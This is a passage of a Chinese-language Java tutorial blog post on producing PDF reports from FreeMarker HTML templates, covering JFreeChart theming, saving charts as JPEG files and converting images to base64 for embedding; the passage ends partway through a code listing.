class="hljs-name">tbody</span>&gt;</span><br>        &lt;#list schoolTimetable as tab&gt;<br>            &lt;#list tab.weekLessons as weekLessons&gt;<br>                <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>                    &lt;#--xml循环第一个元素,需要合并单元格--&gt;<br>                    &lt;#if weekLessons?is_first&gt;<br>                        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;period&quot;</span> <span class="hljs-attr">rowspan</span>=<span class="hljs-string">&quot;$&#123;tab.lessonsSize&#125;&quot;</span>&gt;</span>$&#123;tab.period&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                    &lt;/#if&gt;<br>                    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>$&#123;weekLessons.mon&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>$&#123;weekLessons.tue&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>$&#123;weekLessons.wed&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>$&#123;weekLessons.thu&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>$&#123;weekLessons.fri&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>            &lt;/#list&gt;<br>        &lt;/#list&gt;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;$&#123;recruitStudentImg&#125;&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;recruitStudentImg&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 90%;margin-left: 5%;margin-right: 15%&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="二、图表生成"><a href="#二、图表生成" class="headerlink" title="二、图表生成"></a>二、图表生成</h1><p>看板业务需求中，在前端展示使用<code>Echarts</code>将数据绘制为折线图、饼状图等是非常常见的。同样地，我们也可以借助<code>JFreeChart</code> 将需要将数据模型转换为图表添加到生成的模板文件中。</p><h2 id="2-1-什么是-JFreeChart"><a href="#2-1-什么是-JFreeChart" class="headerlink" title="2.1 什么是 JFreeChart"></a>2.1 什么是 <code>JFreeChart</code></h2><p><code>JFreeChart</code> 由 David Gilbert 于 2000 年创立。如今，<code>JFreeChart</code> 是 Java 开发人员中使用最广泛的图表库。</p><p><code>JFreeChart</code> 允许创建各种交互式和非交互式图表；可以广泛地定制； 它允许修改图表项目的颜色和绘制，图例，线条或标记的样式。 它会自动绘制轴刻度和图例。可以创建折线图，条形图，面积图，散点图，饼图，甘特图和各种专用图，例如风向图或气泡图。它支持多种输出格式，包括 <code>PNG</code>，<code>JPEG</code>，<code>PDF</code> 和 <code>SVG</code>。</p><blockquote><p>各类图表的详细绘制教程可参考： <a href="https://blog.csdn.net/hfy1237/article/details/126693786?ops_request_misc=%7B%22request_id%22:%22169372606516800188510194%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=169372606516800188510194&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-126693786-null-null.142%5Ev93%5Ekoosearch_v1&utm_term=Jfreechart&spm=1018.2226.3001.4187">Java绘图库JFreeChart的详细使用教程</a> </p></blockquote><h2 id="2-2-依赖引入"><a href="#2-2-依赖引入" class="headerlink" title="2.2 依赖引入"></a>2.2 依赖引入</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- JfreeCharts --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.jfree<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jfreechart<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.5.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-3-图表美化"><a href="#2-3-图表美化" class="headerlink" title="2.3 图表美化"></a>2.3 图表美化</h2><blockquote><p>该部分参考： <a href="https://blog.csdn.net/weixin_41663412/article/details/105015098?ops_request_misc=&request_id=8f56629d6efa4640aea31a8e764421d8&biz_id=&utm_medium=distribute.pc_search_result.none-task-blog-2~all~koosearch~default-7-105015098-null-null.142%5Ev93%5Ekoosearch_v1&utm_term=Jfreechart%E7%BE%8E%E5%8C%96&spm=1018.2226.3001.4187">Jfreechart绘制漂亮的图表</a> </p></blockquote><p>我们知道原生<code>JFreeChart</code>自带的图表绘制并不尽如人意，通过自定义主题可以更接近当前主流<code>Echarts</code> 、<code>Highcharts</code> 的绘图风格。</p><p>原生图表风格：</p><p><img src="/../blog-assets/%E6%8C%89%E6%A8%A1%E6%9D%BF%E7%94%9F%E6%88%90PDF/1693726933835.png" alt="原生JfreeChart"></p><p> 美化后图表风格：<img src="/../blog-assets/%E6%8C%89%E6%A8%A1%E6%9D%BF%E7%94%9F%E6%88%90PDF/aHR0cDovL3N0YXRpYy5vc2NoaW5hLm5ldC91cGxvYWRzL3NwYWNlLzIwMTQvMDYxMS8xNzUxMTlfcVJvMF84NTUwMTkucG5n.png" alt="img"> </p><p>美化工具类<code>ChartConfUtils.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChartConfUtils</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NO_DATA_MSG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;数据加载失败&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Font</span> <span class="hljs-variable">FONT</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Font</span>(<span class="hljs-string">&quot;宋体&quot;</span>, Font.PLAIN, <span class="hljs-number">12</span>);<br>    <span class="hljs-comment">// 颜色</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Color[] CHART_COLORS = &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">255</span>,<span class="hljs-number">188</span>,<span class="hljs-number">117</span>),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">31</span>,<span class="hljs-number">129</span>,<span class="hljs-number">188</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">92</span>,<span class="hljs-number">92</span>,<span class="hljs-number">97</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">144</span>,<span class="hljs-number">237</span>,<span class="hljs-number">125</span>),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">153</span>,<span class="hljs-number">158</span>,<span class="hljs-number">255</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">255</span>,<span class="hljs-number">117</span>,<span class="hljs-number">153</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">253</span>,<span class="hljs-number">236</span>,<span class="hljs-number">109</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">128</span>,<span class="hljs-number">133</span>,<span class="hljs-number">232</span>),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">158</span>,<span class="hljs-number">90</span>,<span class="hljs-number">102</span>),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">255</span>, <span class="hljs-number">204</span>, <span class="hljs-number">102</span>) &#125;;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        setChartTheme();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChartConfUtils</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 中文主题样式 解决乱码</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setChartTheme</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 设置中文主题样式 解决乱码</span><br>        <span class="hljs-type">StandardChartTheme</span> <span class="hljs-variable">chartTheme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardChartTheme</span>(<span class="hljs-string">&quot;CN&quot;</span>);<br>        <span class="hljs-comment">// 设置标题字体</span><br>        chartTheme.setExtraLargeFont(FONT);<br>        <span class="hljs-comment">// 设置图例的字体</span><br>        chartTheme.setRegularFont(FONT);<br>        <span class="hljs-comment">// 设置轴向的字体</span><br>        chartTheme.setLargeFont(FONT);<br>        chartTheme.setSmallFont(FONT);<br>        chartTheme.setTitlePaint(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">51</span>, <span class="hljs-number">51</span>, <span class="hljs-number">51</span>));<br>        chartTheme.setSubtitlePaint(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">85</span>, <span class="hljs-number">85</span>, <span class="hljs-number">85</span>));<br><br>        chartTheme.setLegendBackgroundPaint(Color.WHITE);<span class="hljs-comment">// 设置标注</span><br>        chartTheme.setLegendItemPaint(Color.BLACK);<span class="hljs-comment">//</span><br>        chartTheme.setChartBackgroundPaint(Color.WHITE);<br><br>        Paint[] OUTLINE_PAINT_SEQUENCE = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Paint</span>[] &#123; Color.WHITE &#125;;<br>        <span class="hljs-comment">// 绘制器颜色源</span><br>        <span class="hljs-type">DefaultDrawingSupplier</span> <span class="hljs-variable">drawingSupplier</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultDrawingSupplier</span>(CHART_COLORS, CHART_COLORS, OUTLINE_PAINT_SEQUENCE,<br>                DefaultDrawingSupplier.DEFAULT_STROKE_SEQUENCE, DefaultDrawingSupplier.DEFAULT_OUTLINE_STROKE_SEQUENCE,<br>                DefaultDrawingSupplier.DEFAULT_SHAPE_SEQUENCE);<br>        chartTheme.setDrawingSupplier(drawingSupplier);<br><br>        chartTheme.setPlotBackgroundPaint(Color.WHITE);<span class="hljs-comment">// 绘制区域</span><br>        chartTheme.setPlotOutlinePaint(Color.WHITE);<span class="hljs-comment">// 绘制区域外边框</span><br>        chartTheme.setLabelLinkPaint(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">8</span>, <span class="hljs-number">55</span>, <span class="hljs-number">114</span>));<span class="hljs-comment">// 链接标签颜色</span><br>        chartTheme.setLabelLinkStyle(PieLabelLinkStyle.CUBIC_CURVE);<br><br>        chartTheme.setAxisOffset(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RectangleInsets</span>(<span class="hljs-number">5</span>, <span class="hljs-number">12</span>, <span class="hljs-number">5</span>, <span class="hljs-number">12</span>));<br>        chartTheme.setDomainGridlinePaint(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">192</span>, <span class="hljs-number">208</span>, <span class="hljs-number">224</span>));<span class="hljs-comment">// X坐标轴垂直网格颜色</span><br>        chartTheme.setRangeGridlinePaint(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">192</span>, <span class="hljs-number">192</span>, <span class="hljs-number">192</span>));<span class="hljs-comment">// Y坐标轴水平网格颜色</span><br><br>        chartTheme.setBaselinePaint(Color.WHITE);<br>        chartTheme.setCrosshairPaint(Color.BLUE);<span class="hljs-comment">// 不确定含义</span><br>        chartTheme.setAxisLabelPaint(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">51</span>, <span class="hljs-number">51</span>, <span class="hljs-number">51</span>));<span class="hljs-comment">// 坐标轴标题文字颜色</span><br>        chartTheme.setTickLabelPaint(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">67</span>, <span class="hljs-number">67</span>, <span class="hljs-number">72</span>));<span class="hljs-comment">// 刻度数字</span><br>        chartTheme.setBarPainter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardBarPainter</span>());<span class="hljs-comment">// 设置柱状图渲染</span><br>        chartTheme.setXYBarPainter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardXYBarPainter</span>());<span class="hljs-comment">// XYBar 渲染</span><br><br>        chartTheme.setItemLabelPaint(Color.black);<br>        chartTheme.setThermometerPaint(Color.white);<span class="hljs-comment">// 温度计</span><br><br>        ChartFactory.setChartTheme(chartTheme);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 必须设置文本抗锯齿</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAntiAlias</span><span class="hljs-params">(JFreeChart chart)</span> &#123;<br>        chart.setTextAntiAlias(<span class="hljs-literal">false</span>);<br><br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 设置图例无边框，默认黑色边框</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLegendEmptyBorder</span><span class="hljs-params">(JFreeChart chart)</span> &#123;<br>        <span class="hljs-type">LegendTitle</span> <span class="hljs-variable">legend</span> <span class="hljs-operator">=</span> chart.getLegend();<span class="hljs-comment">// 图例对象</span><br>        legend.setFrame(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BlockBorder</span>(Color.WHITE));<br>        legend.setPosition(RectangleEdge.TOP);<span class="hljs-comment">// 图例所在位置(上、下、左、右)</span><br>        legend.setVisible(<span class="hljs-literal">true</span>);<span class="hljs-comment">// 是否显示图例</span><br>        legend.setItemFont(FONT);<span class="hljs-comment">// 图例大小</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-4-图表生成"><a href="#2-4-图表生成" class="headerlink" title="2.4 图表生成"></a>2.4 图表生成</h2><h3 id="图表生成"><a href="#图表生成" class="headerlink" title="图表生成"></a>图表生成</h3><p>工具类<code>JfreeChartUtil</code> 用于根据数据集生成图表并保存图片至相对路径<code>template/img</code>下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * JFreeChart 图表绘制工具类</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : DunkingCurry</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@createTime</span> : 2023/8/8 21:47</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JfreeChartUtil</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 图片保存的相对路径地址</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">IMG_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;template/img&quot;</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 依据数据生成图表并导出图片至classpath路径</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">generateChartsAndExportJpg</span><span class="hljs-params">(String title,</span><br><span class="hljs-params">                                                  String xAxisLabel,</span><br><span class="hljs-params">                                                  String yAxisLabel,</span><br><span class="hljs-params">                                                  DefaultCategoryDataset dataset,</span><br><span class="hljs-params">                                                  String outputJpgName)</span> &#123;<br><br>        <span class="hljs-comment">// 主题样式设置</span><br>        ChartConfUtils.setChartTheme();<br>        <span class="hljs-comment">// 创建JFreeChart对象</span><br>        <span class="hljs-type">JFreeChart</span> <span class="hljs-variable">chart</span> <span class="hljs-operator">=</span> ChartFactory.createBarChart(<br>                <span class="hljs-comment">// 图标题</span><br>                title,<br>                <span class="hljs-comment">// x轴标题</span><br>                xAxisLabel,<br>                <span class="hljs-comment">// y轴标题</span><br>                yAxisLabel,<br>                <span class="hljs-comment">//数据集</span><br>                dataset,<br>                <span class="hljs-comment">//图表方向</span><br>                PlotOrientation.VERTICAL,<br>                <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// 设置图例</span><br>        ChartConfUtils.setLegendEmptyBorder(chart);<br><br><br>        <span class="hljs-comment">//将生成的图片保存到本地</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">contextPath</span> <span class="hljs-operator">=</span> Objects.requireNonNull(JfreeChartUtil.class.getClassLoader().getResource(IMG_PATH)).getPath();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> contextPath + <span class="hljs-string">&quot;/&quot;</span>+outputJpgName;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">lineChart</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filePath);<br>        <span class="hljs-comment">//生成文件</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            ChartUtils.saveChartAsJPEG(lineChart, chart,<span class="hljs-number">1080</span>,<span class="hljs-number">540</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;保存图片&quot;</span>+outputJpgName+<span class="hljs-string">&quot;异常&quot;</span>);<br>        &#125;<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="图表引入模板"><a href="#图表引入模板" class="headerlink" title="图表引入模板"></a>图表引入模板</h3><p>要在HTML中使用<code>&lt;img&gt;</code>标签插入图片一般有两种方式</p><ol><li>指定图片文件路径<code>URL</code></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;path/to/image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;路径插入&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;500&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;600&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>指定图片以<code>Base64</code> 格式插入</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:image/jpeg;base64,/9j/4AAQSkZJRgABRU...&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;base64插入&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>对于前端展示页面，通常使用第一种方式，渲染更快速也更直观；然而在生成模板过程中我们需要用到第二种方式。在<code>HTML</code> 转<code>PDF</code> 的过程中，<code> flying-saucer</code>无法识别图片路径，因此我们需要将图片转为<code>base64</code>格式 。</p><p>图片转<code>base64</code> 工具类 <code>ImgBase64Util</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ImgBase64Util 图片转Base64 工具类</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> DunkingCurry</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImgBase64Util</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">IMG_PRE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;data:image/jpg;base64,&quot;</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 本地图片转换成base64字符串</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> imgFile 图片本地路径</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">imageToBase64ByLocal</span><span class="hljs-params">(String imgFile)</span> &#123;<span class="hljs-comment">// 将图片文件转化为字节数组字符串，并对其进行Base64编码处理</span><br><br><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] data = <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-comment">// 读取图片字节数组</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            fis = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(imgFile);<br>            <span class="hljs-comment">//新的 byte 数组输出流，缓冲区容量1024byte</span><br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>(<span class="hljs-number">1024</span>);<br>            <span class="hljs-comment">//缓存</span><br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span> ((n = fis.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>                bos.write(b, <span class="hljs-number">0</span>, n);<br>            &#125;<br>            fis.close();<br>            <span class="hljs-comment">//改变为byte[]</span><br>            data = bos.toByteArray();<br><br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (fis != <span class="hljs-literal">null</span>) &#123;<br>                    fis.close();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> IMG_PRE+DatatypeConverter.printBase64Binary(data);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span 